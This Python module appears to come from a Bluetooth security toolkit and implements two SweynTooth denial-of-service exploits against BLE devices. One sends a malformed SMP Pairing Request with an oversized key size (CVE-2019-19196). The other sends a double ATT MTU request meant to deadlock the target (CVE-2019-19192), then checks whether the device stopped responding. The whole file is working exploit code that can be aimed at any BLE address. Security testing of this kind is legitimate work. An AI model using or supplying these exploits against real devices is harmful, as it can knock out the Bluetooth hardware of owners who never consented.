"""DoS-oriented BLE CVE probes."""

from __future__ import annotations

import time
from typing import Any

from blue_tap.attack.cve_checks_ble_smp import _connect_ble_smp
from blue_tap.fuzz.protocols.att import build_exchange_mtu_req
from blue_tap.fuzz.protocols.smp import build_pairing_request
from blue_tap.fuzz.transport import BLETransport


def sweyntooth_key_size_overflow(address: str, hci: str = "hci0",
                                 max_key_size: int = 253) -> dict[str, Any]:
    """CVE-2019-19196 Variant B: malformed SMP Pairing Request key-size trigger."""
    start = time.time()
    sock = _connect_ble_smp(address, timeout=8.0)
    if sock is None:
        return {
            "target": address,
            "attack": "sweyntooth_key_size_overflow",
            "attack_name": "sweyntooth_key_size_overflow",
            "packets_sent": 0,
            "duration_seconds": round(time.time() - start, 2),
            "result": "error",
            "notes": "BLE SMP fixed channel not reachable",
        }

    try:
        pkt = build_pairing_request(
            io_cap=0x04,
            oob=0x00,
            auth_req=0x05,
            max_key_size=max_key_size,
            init_key_dist=0x00,
            resp_key_dist=0x00,
        )
        sock.sendall(pkt)
        try:
            sock.settimeout(2.0)
            resp = sock.recv(256)
        except TimeoutError:
            resp = b""
        except OSError as exc:
            return {
                "target": address,
                "attack": "sweyntooth_key_size_overflow",
                "attack_name": "sweyntooth_key_size_overflow",
                "packets_sent": 1,
                "duration_seconds": round(time.time() - start, 2),
                "result": "target_unresponsive",
                "notes": f"SMP connection dropped after malformed Pairing Request: {exc}",
            }

        if not resp:
            return {
                "target": address,
                "attack": "sweyntooth_key_size_overflow",
                "attack_name": "sweyntooth_key_size_overflow",
                "packets_sent": 1,
                "duration_seconds": round(time.time() - start, 2),
                "result": "target_unresponsive",
                "notes": "No SMP response after malformed Pairing Request(max_key_size=253)",
            }

        return {
            "target": address,
            "attack": "sweyntooth_key_size_overflow",
            "attack_name": "sweyntooth_key_size_overflow",
            "packets_sent": 1,
            "duration_seconds": round(time.time() - start, 2),
            "result": "success",
            "notes": f"Target returned SMP opcode 0x{resp[0]:02X} after malformed Pairing Request",
        }
    finally:
        try:
            sock.close()
        except OSError:
            pass


def sweyntooth_att_deadlock(address: str, hci: str = "hci0",
                            mtu: int = 247, settle_seconds: float = 1.0) -> dict[str, Any]:
    """CVE-2019-19192 sequential ATT request deadlock probe."""
    start = time.time()
    address_type = BLETransport._detect_address_type(address)
    transport = BLETransport(address, cid=BLETransport.ATT_CID, address_type=address_type, timeout=4.0)
    first_sent = 0

    try:
        if not transport.connect():
            return {
                "target": address,
                "attack": "sweyntooth_att_deadlock",
                "attack_name": "sweyntooth_att_deadlock",
                "packets_sent": 0,
                "duration_seconds": round(time.time() - start, 2),
                "result": "error",
                "notes": "BLE ATT fixed channel not reachable",
            }

        req = build_exchange_mtu_req(mtu)
        if transport.send(req) > 0:
            first_sent += 1
        if transport.send(req) > 0:
            first_sent += 1

        # Intentionally close immediately after the two back-to-back requests.
        transport.close()
        time.sleep(max(settle_seconds, 0.0))

        verify = BLETransport(address, cid=BLETransport.ATT_CID, address_type=address_type, timeout=4.0)
        try:
            if not verify.connect():
                return {
                    "target": address,
                    "attack": "sweyntooth_att_deadlock",
                    "attack_name": "sweyntooth_att_deadlock",
                    "packets_sent": first_sent,
                    "duration_seconds": round(time.time() - start, 2),
                    "result": "target_unresponsive",
                    "notes": "BLE target did not accept a new ATT connection after double MTU request sequence",
                }

            sent = verify.send(build_exchange_mtu_req(mtu))
            if sent <= 0:
                return {
                    "target": address,
                    "attack": "sweyntooth_att_deadlock",
                    "attack_name": "sweyntooth_att_deadlock",
                    "packets_sent": first_sent + max(sent, 0),
                    "duration_seconds": round(time.time() - start, 2),
                    "result": "target_unresponsive",
                    "notes": "ATT verification request could not be sent after double MTU sequence",
                }

            resp = verify.recv(64, recv_timeout=2.0)
            if not resp:
                return {
                    "target": address,
                    "attack": "sweyntooth_att_deadlock",
                    "attack_name": "sweyntooth_att_deadlock",
                    "packets_sent": first_sent + 1,
                    "duration_seconds": round(time.time() - start, 2),
                    "result": "target_unresponsive",
                    "notes": "Target accepted a new BLE link but stayed silent at ATT after double MTU request sequence",
                }

            return {
                "target": address,
                "attack": "sweyntooth_att_deadlock",
                "attack_name": "sweyntooth_att_deadlock",
                "packets_sent": first_sent + 1,
                "duration_seconds": round(time.time() - start, 2),
                "result": "success",
                "notes": f"Target responded to ATT verification opcode 0x{resp[0]:02X} after double MTU request sequence",
            }
        finally:
            verify.close()
    finally:
        transport.close()
